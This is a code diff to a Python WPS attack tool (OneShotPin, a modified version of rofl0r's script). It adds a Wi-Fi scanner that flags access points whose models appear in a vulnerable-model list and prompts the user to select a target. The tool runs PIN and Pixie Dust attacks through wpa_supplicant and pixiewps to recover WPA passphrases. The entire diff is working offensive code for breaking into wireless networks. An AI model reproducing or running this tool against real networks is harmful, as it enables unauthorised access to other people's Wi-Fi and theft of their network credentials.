@@ -1,10 +1,12 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
 import sys
 import subprocess
 import os
 import tempfile
 import shutil
+import re
 
 
 class Data():
@@ -30,6 +32,7 @@ class Data():
         if full_range:
             pixiecmd += ' --force'
         return pixiecmd
+
 
 class Options():
     def __init__(self):
@@ -88,6 +91,19 @@ def wps_reg(options):
     if 'OK' in proc.stdout:
         status = True
     return status
+
+
+def ifaceUp(iface, down=False):
+    if down:
+        action = 'down'
+    else:
+        action = 'up'
+    cmd = 'ip link set {} {}'.format(iface, action)
+    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE)
+    if res.returncode == 0:
+        return True
+    else:
+        return False
 
 
 def statechange(data, old, new):
@@ -154,17 +170,14 @@ def process_wpa_supplicant(pipe, options, data):
     elif 'WPS-FAIL' in line:
         statechange(data, data.state, 'WPS-FAIL')
     elif 'NL80211_CMD_DEL_STATION' in line:
-        #if data.state == 'ASSOCIATED':
-        #   print "URGH"
         print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
-        #return False
     elif 'Trying to authenticate with' in line:
-        if 'SSID' in line: options.essid = line.split("'")[1].replace(r'\xc2\xa0', ' ')
+        if 'SSID' in line: options.essid = line.split("'")[1].replace(r'\xc2\xa0', ' ').replace(r'\"', '"').replace(r'\x20', ' ')
         print('[*] Authenticating...')
     elif 'Authentication response' in line:
         print('[+] Authenticated')
     elif 'Trying to associate with' in line:
-        if 'SSID' in line: options.essid = line.split("'")[1].replace(r'\xc2\xa0', ' ')
+        if 'SSID' in line: options.essid = line.split("'")[1].replace(r'\xc2\xa0', ' ').replace(r'\"', '"').replace(r'\x20', ' ')
         print('[*] Associating with AP...')
     elif 'Associated with' in line and options.interface in line:
         if options.essid:
@@ -205,6 +218,7 @@ def poll_wpa_supplicant(wpas, options, data):
 
 def connect(options, data):
     print('[*] Running wpa_supplicant...')
+    ifaceUp(options.interface)
     wpas = run_wpa_supplicant(options)
 
     try:
@@ -228,7 +242,168 @@ def connect(options, data):
         cleanup(wpas, options)
         sys.exit(1)
     cleanup(wpas, options)
+    ifaceUp(options.interface, down=True)
     return res
+
+
+def wifi_scan(iface):
+    '''Parsing iw scan results'''
+    def handle_network(line, result, networks):
+        networks.append(
+                {
+                    'Security type': 'Unknown',
+                    'WPS': False,
+                    'WPS locked': False,
+                    'Model': '',
+                    'Model number': '',
+                    'Device name': ''
+                 }
+            )
+        networks[-1]['BSSID'] = result.group(1).upper()
+
+    def handle_essid(line, result, networks):
+        networks[-1]['ESSID'] = result.group(1).replace(r'\xc2\xa0', ' ').replace(r'\x20', ' ')
+
+    def handle_level(line, result, networks):
+        networks[-1]['Level'] = int(float(result.group(1)))
+
+    def handle_securityType(line, result, networks):
+        sec = networks[-1]['Security type']
+        if result.group(1) == 'capability':
+            if 'Privacy' in result.group(2):
+                sec = 'WEP'
+            else:
+                sec = 'Open'
+        elif sec == 'WEP':
+            if result.group(1) == 'RSN':
+                sec = 'WPA2'
+            elif result.group(1) == 'WPA':
+                sec = 'WPA'
+        elif sec == 'WPA':
+            if result.group(1) == 'RSN':
+                sec = 'WPA/WPA2'
+        elif sec == 'WPA2':
+            if result.group(1) == 'WPA':
+                sec = 'WPA/WPA2'
+        networks[-1]['Security type'] = sec
+
+    def handle_wps(line, result, networks):
+        networks[-1]['WPS'] = result.group(1)
+
+    def handle_wpsLocked(line, result, networks):
+        flag = int(result.group(1), 16)
+        if flag:
+            networks[-1]['WPS locked'] = True
+
+    def handle_model(line, result, networks):
+        networks[-1]['Model'] = result.group(1)
+
+    def handle_modelNumber(line, result, networks):
+        networks[-1]['Model number'] = result.group(1)
+
+    def handle_deviceName(line, result, networks):
+        networks[-1]['Device name'] = result.group(1)
+
+    cmd = 'iw dev {} scan'.format(iface)
+    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                          stderr=subprocess.STDOUT, encoding='utf-8')
+    lines = proc.stdout.splitlines()
+    networks = []
+    matchers = {
+        re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
+        re.compile(r'SSID: (.*)'): handle_essid,
+        re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
+        re.compile(r'(capability): (.+)'): handle_securityType,
+        re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
+        re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
+        re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
+        re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
+        re.compile(r' [*] Model: (.*)'): handle_model,
+        re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
+        re.compile(r' [*] Device name: (.*)'): handle_deviceName
+    }
+
+    for line in lines:
+        line = line.strip('\t')
+        for regexp, handler in matchers.items():
+            res = re.match(regexp, line)
+            if res:
+                handler(line, res, networks)
+
+    # Filtering non-WPS networks
+    networks = list(filter(lambda x: bool(x['WPS']), networks))
+    # Sorting by signal level
+    networks.sort(key=lambda x: x['Level'], reverse=True)
+    return networks
+
+
+def scanner_pretty_print(networks, vuln_list):
+    '''Printing WiFiScan result as table'''
+    def truncateStr(s, l):
+        '''
+        Truncate string with the specified length
+        @s — input string
+        @l — length of output string
+        '''
+        if len(s) > l:
+            k = l - 3
+            s = s[:k] + '...'
+        return s
+
+    def colored(text, color=None):
+        '''Returns colored text'''
+        if color:
+            if color == 'green':
+                text = '\033[92m{}\033[00m'.format(text)
+            elif color == 'red':
+                text = '\033[91m{}\033[00m'.format(text)
+            else:
+                return text
+        else:
+            return text
+        return text
+
+    print(colored('Green', color='green'), '— possible vulnerable network',
+          '\n' + colored('Red', color='red'), '— WPS locked',
+          '\nNetworks list:')
+    print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+        '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'WSC device name', 'WSC model'))
+    for i in range(0, len(networks)):
+        n = i + 1
+        number = '{})'.format(n)
+        network = networks[i]
+        model = '{} {}'.format(network['Model'], network['Model number'])
+        essid = truncateStr(network['ESSID'], 25)
+        deviceName = truncateStr(network['Device name'], 27)
+        line = '{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
+            number, network['BSSID'], essid,
+            network['Security type'], network['Level'],
+            deviceName, model
+            )
+        if network['WPS locked']:
+            print(colored(line, color='red'))
+        elif model in vuln_list:
+            print(colored(line, color='green'))
+        else:
+            print(line)
+
+
+def suggest_network(options, vuln_list):
+    networks = wifi_scan(options.interface)
+    if not networks:
+        die('No networks found.')
+    scanner_pretty_print(networks, vuln_list)
+    while 1:
+        networkNo = input('Select target: ')
+        try:
+            if int(networkNo) in range(1, len(networks)+1):
+                options.bssid = networks[int(networkNo) - 1]['BSSID']
+            else:
+                raise IndexError
+        except Exception:
+            print('Invalid number')
+        else:
+            break
 
 
 def parse_pixiewps(output):
@@ -253,9 +428,9 @@ OneShotPin 0.0.2 (c) 2017 rofl0r, moded by drygdryg
 
 Required Arguments:
     -i, --interface=<wlan0>  : Name of the interface to use
-    -b, --bssid=<mac>        : BSSID of the target AP
 
 Optional Arguments:
+    -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -F, --force              : Run Pixiewps with --force option (bruteforce full range)
@@ -274,6 +449,7 @@ def cleanup(wpas, options):
 
 
 if __name__ == '__main__':
+    VULNWSCFILE = 'vulnwsc.txt'
     options = Options()
 
     import getopt
@@ -287,19 +463,30 @@ if __name__ == '__main__':
         elif a in ('-X'): options.showpixiecmd = True
         elif a in ('-v'): options.verbose = True
         elif a == '--help': usage()
-    if not options.interface or not options.bssid:
-        die("Missing required argument! (use --help for usage)")
-    if options.pin is None:
-        if not options.pixiemode:
-            die("You need to supply a pin or enable pixiemode (-K)! (use --help for usage)")
-        else:
-            options.pin = '12345670'
-
     if os.getuid() != 0:
         die("Run it as root")
+    if not options.interface:
+        die("Please specify interface name (-i) (use --help for usage)")
+    if options.pin is None:
+        if options.pixiemode:
+            options.pin = '12345670'
+        else:
+            die("You need to supply a pin or enable pixiemode (-K)! (use --help for usage)")
+    if not ifaceUp(options.interface):
+        die('Unable to up interface "{}"'.format(options.interface))
+    if not options.bssid:
+        print('BSSID not specified (--bssid) — scanning for available networks...')
+        try:
+            with open(VULNWSCFILE, 'r') as file:
+                vuln_list = file.read().splitlines()
+        except FileNotFoundError:
+            vuln_list = []
+        try:
+            suggest_network(options, vuln_list)
+        except KeyboardInterrupt:
+            die('\nAborting...')
 
     data = Data()
-
     connect(options, data)
 
     if data.wpa_psk:
@@ -320,7 +507,6 @@ if __name__ == '__main__':
             options.pixiemode = False
             data.clear()
             print('[+] Trying to get WPA PSK with the correct PIN...'.format(options.pin))
-
             connect(options, data)
 
             if data.wpa_psk:
